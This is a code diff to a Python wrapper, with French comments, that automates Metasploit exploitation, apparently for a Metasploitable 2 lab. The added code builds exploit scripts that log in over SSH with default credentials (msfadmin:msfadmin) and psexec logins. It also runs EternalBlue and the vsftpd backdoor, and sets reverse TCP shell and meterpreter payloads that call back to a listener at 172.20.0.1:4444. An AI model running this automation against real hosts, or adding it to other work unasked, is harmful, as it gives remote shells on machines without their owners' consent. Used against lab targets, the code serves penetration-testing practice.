@@ -747,13 +747,23 @@ class MetasploitWrapper:
             }
     
     def run_exploit_module(self, target: str, port: int, exploit_module: str, 
-                          options: Dict = None, timeout: int = 120) -> Dict[str, Any]:
-        """Lance un module d'exploitation Metasploit - VERSION NON-INTERACTIVE"""
+                          options: Dict = None, timeout: int = 300) -> Dict[str, Any]:
+        """Lance un module d'exploitation Metasploit - VERSION AMÉLIORÉE"""
         try:
             logger.info(f"🎯 Lancement exploit: {exploit_module} sur {target}:{port}")
             
+            # ✅ CREDENTIALS PAR DÉFAUT POUR METASPLOITABLE 2
+            enhanced_options = options.copy() if options else {}
+            
+            # Ajouter des credentials par défaut si pas spécifiés
+            if 'ssh' in exploit_module.lower() and 'sshexec' in exploit_module:
+                if 'USERNAME' not in enhanced_options:
+                    enhanced_options['USERNAME'] = 'msfadmin'
+                if 'PASSWORD' not in enhanced_options:
+                    enhanced_options['PASSWORD'] = 'msfadmin'
+            
             # Créer le script de commandes Metasploit
-            commands = self._build_exploit_script(target, port, exploit_module, options or {})
+            commands = self._build_exploit_script(target, port, exploit_module, enhanced_options)
             
             # Écrire dans un fichier temporaire
             with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
@@ -774,7 +784,8 @@ class MetasploitWrapper:
                     'target': f"{target}:{port}",
                     'raw_output': result['stdout'],
                     'parsed_result': parsed_result,
-                    'command_used': ' '.join(command)
+                    'command_used': ' '.join(command),
+                    'credentials_used': f"{enhanced_options.get('USERNAME', 'N/A')}:{enhanced_options.get('PASSWORD', 'N/A')}"
                 }
                 
             finally:
@@ -799,7 +810,7 @@ class MetasploitWrapper:
         try:
             # Sélectionner le module approprié selon le service
             if service.lower() in self.common_exploits:
-                module = exploit_module
+                module = self.common_exploits[service.lower()]
             else:
                 # Module générique de scan de ports
                 module = 'auxiliary/scanner/portscan/tcp'
@@ -895,58 +906,92 @@ exit
                 'error': str(e),
                 'search_query': search_query if 'search_query' in locals() else 'N/A'
             }
-    
+
     def _build_exploit_script(self, target: str, port: int, exploit_module: str, options: Dict) -> str:
-        """Construit un script Metasploit pour exploitation"""
+        """Construit un script Metasploit pour exploitation - VERSION CORRIGÉE"""
         script = f"""
 use {exploit_module}
 set RHOSTS {target}
 set RPORT {port}
 """
         
+        # ✅ GESTION SPÉCIALE POUR SSH EXPLOITS
+        if 'ssh' in exploit_module.lower():
+            # Pour exploit/multi/ssh/sshexec - credentials requis
+            if 'sshexec' in exploit_module:
+                script += f"set USERNAME {options.get('USERNAME', 'msfadmin')}\n"
+                script += f"set PASSWORD {options.get('PASSWORD', 'msfadmin')}\n"
+                
+                # Payload par défaut pour SSH
+                payload = options.get('PAYLOAD', 'linux/x64/shell/reverse_tcp')
+                script += f"set PAYLOAD {payload}\n"
+                
+                # LHOST et LPORT pour reverse shell
+                script += f"set LHOST {options.get('LHOST', '172.20.0.1')}\n"  # IP du conteneur
+                script += f"set LPORT {options.get('LPORT', '4444')}\n"
+        
+        # ✅ GESTION POUR SMB EXPLOITS
+        elif 'smb' in exploit_module.lower():
+            if 'eternalblue' in exploit_module or 'ms17_010' in exploit_module:
+                payload = options.get('PAYLOAD', 'windows/x64/meterpreter/reverse_tcp')
+                script += f"set PAYLOAD {payload}\n"
+                script += f"set LHOST {options.get('LHOST', '172.20.0.1')}\n"
+                script += f"set LPORT {options.get('LPORT', '4444')}\n"
+            elif 'psexec' in exploit_module:
+                script += f"set SMBUser {options.get('USERNAME', 'administrator')}\n"
+                script += f"set SMBPass {options.get('PASSWORD', 'password')}\n"
+        
+        # ✅ GESTION POUR FTP EXPLOITS  
+        elif 'ftp' in exploit_module.lower():
+            if 'vsftpd' in exploit_module:
+                # VSFTPD backdoor n'a pas besoin de credentials
+                payload = options.get('PAYLOAD', 'cmd/unix/interact')
+                script += f"set PAYLOAD {payload}\n"
+        
         # Ajouter les options personnalisées
         for key, value in options.items():
-            script += f"set {key.upper()} {value}\n"
+            if key.upper() not in ['USERNAME', 'PASSWORD', 'PAYLOAD', 'LHOST', 'LPORT']:
+                script += f"set {key.upper()} {value}\n"
         
-        # Payload par défaut si pas spécifié
-        if 'PAYLOAD' not in [k.upper() for k in options.keys()]:
-            script += f"set PAYLOAD {self.common_payloads.get('linux', 'generic/shell_reverse_tcp')}\n"
-        
-        # LHOST par défaut
-        if 'LHOST' not in [k.upper() for k in options.keys()]:
-            script += "set LHOST 127.0.0.1\n"
-        
-        # LPORT par défaut  
-        if 'LPORT' not in [k.upper() for k in options.keys()]:
-            script += "set LPORT 4444\n"
-        
+        # ✅ COMMANDES D'EXPLOITATION
         script += """
 check
 exploit -z
+sessions -l
 exit
 """
         return script
     
     def _build_auxiliary_script(self, target: str, port: int, module: str, options: Dict) -> str:
-        """Construit un script pour modules auxiliaires"""
+        """Construit un script pour modules auxiliaires - VERSION CORRIGÉE"""
         script = f"""
-use {module}
-set RHOSTS {target}
-set RPORT {port}
-"""
-        
+    use {module}
+    set RHOSTS {target}
+    set RPORT {port}
+    """
+    
         # Options communes pour scanners
         script += "set THREADS 10\n"
         script += "set VERBOSE true\n"
-        
-        # Ajouter les options personnalisées
+    
+        # ✅ CORRECTION : Filtrer les options valides pour les modules auxiliaires
+        valid_auxiliary_options = {
+            'USERNAME', 'PASSWORD', 'USER_FILE', 'PASS_FILE', 'USERPASS_FILE',
+            'STOP_ON_SUCCESS', 'BRUTEFORCE_SPEED', 'DB_ALL_CREDS', 'DB_ALL_PASS',
+            'DB_ALL_USERS', 'BLANK_PASSWORDS', 'USER_AS_PASS', 'THREADS', 'VERBOSE'
+        }
+    
+        # Ajouter seulement les options valides
         for key, value in options.items():
-            script += f"set {key.upper()} {value}\n"
-        
+            key_upper = key.upper()
+            if key_upper in valid_auxiliary_options:
+                script += f"set {key_upper} {value}\n"
+            # Ignorer les options non-valides comme MODE, PAYLOAD, LHOST, LPORT
+    
         script += """
-run
-exit
-"""
+    run
+    exit
+    """
         return script
     
     def _parse_exploit_output(self, output: str, module: str) -> Dict[str, Any]:
